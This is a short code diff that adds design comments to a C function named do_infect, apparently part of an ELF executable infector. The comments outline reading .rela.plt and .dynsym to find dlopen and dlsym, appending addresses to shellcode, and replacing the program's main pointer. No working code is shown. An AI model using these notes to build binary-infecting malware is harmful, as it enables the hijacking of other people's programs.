@@ -301,6 +301,19 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 
 	// grab the shellcode
 
+	// NOTES
+	// Because we need dlopen and dlsym, we are just going to depend on the plt already having our things
+	// so, we need to read the .rela.plt, and use the info section to find the index in the .dynsym
+	// #define ELF32_R_SYM(val) ((val) >> 8)
+	// #define ELF32_R_TYPE(val) ((val) & 0xff)
+
+	// give the shellcode the needed addresses on the end, in the correct positions
+	// #1 Original Main
+	// #2 dynopen
+	// #3 dynsym
+	// #4 library path
+	// #5 functin name
+
 	// put in our new main
 
 	// overwrite original main pointer
